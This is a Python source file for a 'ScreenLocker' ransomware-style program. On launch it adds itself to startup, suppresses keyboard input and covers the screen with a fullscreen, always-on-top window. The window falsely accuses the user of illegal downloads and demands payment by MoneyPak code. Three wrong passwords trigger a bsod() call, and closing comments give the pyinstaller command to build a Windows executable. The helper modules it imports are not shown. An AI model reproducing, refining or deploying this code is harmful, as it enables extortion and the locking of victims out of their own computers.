#! /usr/bin python
# -*- coding: utf-8 -*-


from tkinter import *
import tkinter
import time
from tkinter import messagebox
from functools import partial
#import customtkinter



from modules import bsod, startup, uninstall

import os

import keyboard
import sys

#customtkinter.set_appearance_mode("System")  # Modes: system (default), light, dark
#customtkinter.set_default_color_theme("blue")


wind = Tk()
password = "12345"
lock_text = "Your computer has been locked!"
count = 3

seconds = 86400
stop = abs(seconds)
def countdown():
	global seconds
	seconds -= 1
	if seconds < 0:
		return

#timer = Label(wind, bg='yellow', fg='red', height=4, width=15).place(x=20, y=220)

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])

startup(file_path)

def buton(arg):
	enter_pass.insert(END, arg)
def delbuton():
	enter_pass.delete(-1, END)


def tapp(key):
	pass

def check():
	global count
	if enter_pass.get() == password:
		messagebox.showinfo("ScreenLocker","UNLOCKED SUCCESSFULLY")

		uninstall(wind)
	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("ScreenLocker","number of attempts expired")
			bsod()
		else:
			
			messagebox.showwarning("ScreenLocker","Wrong password. Avalible tries: "+ str(count))


def exiting():
	messagebox.showwarning("ScreenLocker","DEATH IS INEVITABLE")
wind.title("ScreenLocker")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="red", padx=10, pady=10, text="\nWINDOWS LOCKED BY ScreenLocker\n\n\n", font="helvetica 40").pack()
untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
untex.place(x=210, y=170)
heading = 'Announcement'
announcement = Label(wind, bg='black', fg='red', font='helvetica 25 bold', text=heading).place(x=50, y=290)

note = '''Your computer has been locked due to
suspicion of illigal content download and
distribution.
Nothing to worry, the files are not encrypted
you are blocked from accessing your\ncomputer'''
T =Text(wind, height=7, width=35, fg='red',bd=0, exportselection=0, bg='black', font='helvetica 19')
T.place(x=50, y=340)
T.insert(INSERT, note)

procedure = 'How to unlock your computer'
procedure = Label(wind, bg='black', fg='red', font='helvetica 25 bold', text=procedure).place(x=50, y=530)
steps = '''1. Take your cash to one of the store.
2. Get a Moneypak and puchange it with case at the register
3. come back and enter your moneypak code.'''
T1 =Text(wind, height=5, width=30, fg='red',bd=0, exportselection=0, bg='black', font='helvetica 19')
T1.place(x=50, y=580)
T1.insert(INSERT, steps)




keyboard.on_press(tapp, suppress=True)

#the line
#line = Canvas(wind, width=500, height=300).create_line(10, 20, 20, 5, fill='red', width=5)
vertical = Frame(wind, bg='red', height=490, width=2)
vertical.pack()#place(x=520, y=310)

#horizontal = Frame(wind, bg='red', height=2, width=560)
#horizontal.place(x=260, y=280)


enter_pass = Entry(wind,bg="black", bd=30, fg="red", text="",show='•', font="helvetica 35", width=11, insertwidth=4, justify = "center")
enter_pass.place(x=715, y=290)     #pack
wind.resizable(0,0)


wind.lift()
wind.attributes('-topmost',True)

wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)
wind.protocol("WM_DELETE_WINDOW", exiting)

left_value = 20
moving_value = 80
#button = customtkinter.CTkButton(wind,text='unlock', height=80, width=100, command=check).place(x=640 + left_value, y=720)
#delbutton = customtkinter.CTkButton(wind,text="<", height=80, width=100, command=delbuton).place(x=340 + moving_value, y=720)
#button1 = customtkinter.CTkButton(wind,text="1", height=80, width=100, command=partial(buton, "1")).place(x=340 + moving_value, y=450)
#button2 = customtkinter.CTkButton(wind,text="2", height=80, width=100, command=partial(buton, "2")).place(x=490 + 50, y=450)
#button3 = customtkinter.CTkButton(wind,text="3", height=80, width=100, command=partial(buton, "3")).place(x=640 + left_value, y=450)
#button4 = customtkinter.CTkButton(wind,text="4", height=80, width=100, command=partial(buton, "4")).place(x=340 + moving_value, y=540)
#button5 = customtkinter.CTkButton(wind,text="5", height=80, width=100, command=partial(buton, "5")).place(x=490 + 50, y=540)
#button6 = customtkinter.CTkButton(wind,text="6", height=80, width=100, command=partial(buton, "6")).place(x=640 + left_value, y=540)
#button7 = customtkinter.CTkButton(wind,text="7", height=80, width=100, command=partial(buton, "7")).place(x=340 + moving_value, y=630)
#button8 = customtkinter.CTkButton(wind,text="8", height=80, width=100, command=partial(buton, "8")).place(x=490 + 50, y=630)
#button9 = customtkinter.CTkButton(wind,text="9", height=80, width=100, command=partial(buton, "9")).place(x=640 + left_value, y=630)
#button0 = customtkinter.CTkButton(wind,text="0", height=80, width=100, command=partial(buton, "0")).place(x=490 + 50, y=720)

button1 = Button(wind,text="1", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "1")).place(x=640 + moving_value, y=450)
button2 = Button(wind,text="2", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "2")).place(x=790 + 50, y=450)
button3 = Button(wind,text="3", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "3")).place(x=940 + left_value, y=450)
button4 = Button(wind,text="4", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "4")).place(x=640 + moving_value, y=540)
button5 = Button(wind,text="5", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "5")).place(x=790 + 50, y=540)
button6 = Button(wind,text="6", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "6")).place(x=940 + left_value, y=540)
button7 = Button(wind,text="7", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "7")).place(x=760 + moving_value, y=630)
button8 = Button(wind,text="8", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "8")).place(x=670 + 50, y=630)
button9 = Button(wind,text="9", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "9")).place(x=940 + left_value, y=630)
button0 = Button(wind,text="0", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "0")).place(x=790 + 50, y=720)
delbutton = Button(wind,text="Delete", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=delbuton).place(x=640 + moving_value, y=720)
button = Button(wind,text="Unlock", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=check).place(x=940 + left_value, y=720)


wind.mainloop()

# after writing the code open powershell and enter the command to create .exe
# pyinstaller -F -w screenlocker.py
# find the windows executable file in dist folder